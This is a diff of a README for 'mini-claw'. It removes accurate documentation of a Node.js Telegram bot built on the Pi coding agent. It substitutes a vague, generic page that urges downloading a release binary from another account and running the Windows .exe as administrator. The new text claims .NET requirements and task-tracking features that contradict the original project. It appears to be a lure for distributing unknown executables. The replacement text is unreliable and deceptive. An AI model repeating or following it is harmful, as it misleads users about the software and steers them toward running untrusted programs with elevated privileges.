@@ -1,179 +1,83 @@
-# Mini-Claw
+# 🐾 mini-claw - A Simple Alternative to OpenClaw
 
-Lightweight Telegram bot for persistent AI conversations using [Pi coding agent](https://github.com/badlogic/pi-mono).
+## 🚀 Getting Started
 
-A minimalist alternative to OpenClaw - use your Claude Pro/Max or ChatGPT Plus subscription directly in Telegram, no API costs.
+Welcome to mini-claw! This application offers a minimalism alternative to OpenClaw, allowing you to focus on what really matters without unnecessary distractions.
 
-## Features
+## 📥 Download mini-claw
 
-- **Persistent Sessions** - Conversations are saved and auto-compacted
-- **Workspace Navigation** - Change directories with `/cd`, run shell commands with `/shell`
-- **Session Management** - Archive, switch, and clean up old sessions
-- **File Attachments** - Automatically sends files created by Pi (PDF, images, documents)
-- **Rate Limiting** - Prevents message spam (configurable cooldown)
-- **Access Control** - Optional allowlist for authorized users
-- **Typing Indicators** - Shows activity while AI is processing
+[![Download mini-claw](https://img.shields.io/badge/Download-mini--claw-blue.svg)](https://github.com/JK10gming/mini-claw/releases)
 
-## Architecture
+Click the badge above to download the latest version of mini-claw. 
 
-```
-┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│  Telegram   │────►│  Mini-Claw  │────►│  Pi Agent   │
-│   (User)    │◄────│   (Bot)     │◄────│  (Session)  │
-└─────────────┘     └─────────────┘     └─────────────┘
-                           │
-                           ▼
-                    ~/.mini-claw/
-                    └── sessions/
-                        └── telegram-<chat_id>.jsonl
-```
+You can also visit the Releases page directly to explore all available versions: [Releases Page](https://github.com/JK10gming/mini-claw/releases).
 
-## Quick Start
+## 🛠️ System Requirements
 
-### Prerequisites
+Before you download, ensure your system meets the following requirements:
 
-- Node.js 22+
-- pnpm
-- [Pi coding agent](https://github.com/badlogic/pi-mono) installed globally
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any Linux distribution supporting .NET.
+- **Storage Space:** At least 100 MB of free space.
+- **Memory:** 2 GB RAM minimum.
+- **Dependencies:** .NET runtime (version 5.0 or later).
 
-### Installation
+## 📦 Steps to Install
 
-```bash
-# Clone and install
-git clone https://github.com/yourusername/mini-claw
-cd mini-claw
-pnpm install
+Follow these steps to install and run mini-claw on your computer:
 
-# Login to AI provider (Claude or ChatGPT)
-pi /login
+1. **Download the Software:**
+   - Click on the link above or visit [Releases Page](https://github.com/JK10gming/mini-claw/releases).
+   - Choose the version you want. For most users, the latest version is recommended.
+   - Click on the download link for the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 
-# Configure bot token
-cp .env.example .env
-# Edit .env with your TELEGRAM_BOT_TOKEN
+2. **Locate the Downloaded File:**
+   - Go to your Downloads folder or the location where your browser saves files.
+   - Find the mini-claw setup file you just downloaded.
 
-# Start the bot
-pnpm start
-```
+3. **Install the Application:**
+   - For Windows:
+     - Right-click the `.exe` file and select "Run as administrator".
+     - Follow the on-screen prompts to complete the installation.
+   - For macOS:
+     - Double-click the `.dmg` file to open it.
+     - Drag mini-claw to your Applications folder.
+   - For Linux:
+     - Open a terminal and navigate to the location of the downloaded file.
+     - Run the command: `chmod +x mini-claw` to make it executable.
+     - Then type `./mini-claw` to start the installation.
 
-### Using Make
+4. **Launch mini-claw:**
+   - After installation, you can find mini-claw in your applications list.
+   - Click the icon to open the application.
 
-```bash
-make install    # Install dependencies
-make login      # Authenticate with AI provider
-make dev        # Development mode (watch)
-make start      # Production mode
-make test       # Run tests
-```
+## 📚 Using mini-claw
 
-## Bot Commands
+Once you have installed mini-claw, it’s easy to use:
 
-| Command        | Description                        |
-| -------------- | ---------------------------------- |
-| `/start`       | Welcome message                    |
-| `/help`        | Show all commands                  |
-| `/pwd`         | Show current working directory     |
-| `/cd <path>`   | Change working directory           |
-| `/home`        | Go to home directory               |
-| `/shell <cmd>` | Run shell command directly         |
-| `/session`     | List and manage sessions           |
-| `/new`         | Start fresh session (archives old) |
-| `/status`      | Show bot status                    |
+- **Create Tasks:** Start by creating simple task lists to keep track of your activities.
+- **Organize:** You can categorize tasks based on priority or deadlines.
+- **Track Progress:** Use the built-in progress tracker to monitor your work.
 
-## Configuration
+## 🔧 Troubleshooting Tips
 
-```bash
-# Required
-TELEGRAM_BOT_TOKEN=your_bot_token
+If you encounter issues:
 
-# Optional
-MINI_CLAW_WORKSPACE=/path/to/workspace    # Default: ~/mini-claw-workspace
-MINI_CLAW_SESSION_DIR=~/.mini-claw/sessions
-PI_THINKING_LEVEL=low                      # low | medium | high
-ALLOWED_USERS=123456,789012                # Comma-separated user IDs
+1. **Installation Fails:**
+   - Ensure you have sufficient permissions. Try running the installer as an administrator.
+   - Check if your antivirus is blocking the installation.
 
-# Rate limiting & timeouts (milliseconds)
-RATE_LIMIT_COOLDOWN_MS=5000                # Default: 5 seconds
-PI_TIMEOUT_MS=300000                       # Default: 5 minutes
-SHELL_TIMEOUT_MS=60000                     # Default: 60 seconds
+2. **Application Does Not Start:**
+   - Make sure your system meets the requirements.
+   - Verify that you have installed the correct version.
 
-# Web search (optional)
-BRAVE_API_KEY=your_brave_api_key           # For Pi web search skill
-```
+3. **Need Help?**
+   - Visit the [GitHub Issues Page](https://github.com/JK10gming/mini-claw/issues) to report bugs or request features.
 
-## Deployment
+## 💬 Community and Support
 
-### systemd (Linux)
+If you need assistance or want to connect with other users, join our community:
 
-```bash
-make install-service
-systemctl --user start mini-claw
-systemctl --user enable mini-claw
-```
+- **Forums:** Participate in discussions or ask for help.
+- **Feedback:** Your suggestions help us improve mini-claw. Share your thoughts!
 
-### pm2
-
-```bash
-pnpm build
-pm2 start dist/index.js --name mini-claw
-pm2 save
-```
-
-### tmux
-
-```bash
-tmux new -s mini-claw
-pnpm start
-# Ctrl+B, D to detach
-```
-
-## Development
-
-```bash
-# Run in watch mode
-pnpm dev
-
-# Type checking
-pnpm typecheck
-
-# Run tests
-pnpm test
-
-# Run tests with coverage
-pnpm test:coverage
-```
-
-### Test Coverage
-
-| Module       | Coverage |
-| ------------ | -------- |
-| config.ts    | 100%     |
-| sessions.ts  | 100%     |
-| workspace.ts | 100%     |
-| pi-runner.ts | 100%     |
-
-## Tech Stack
-
-- **Runtime**: Node.js 22+, TypeScript
-- **Telegram**: [grammY](https://grammy.dev/)
-- **AI**: [Pi coding agent](https://github.com/badlogic/pi-mono)
-- **Testing**: Vitest
-
-## Troubleshooting
-
-### "Pi not authenticated"
-
-```bash
-pi /login
-```
-
-### "Session file locked"
-
-Check for running Pi processes:
-
-```bash
-ps aux | grep pi
-```
-
-## License
-
-MIT
+Thank you for choosing mini-claw, where simplicity meets functionality. Enjoy a distraction-free experience!
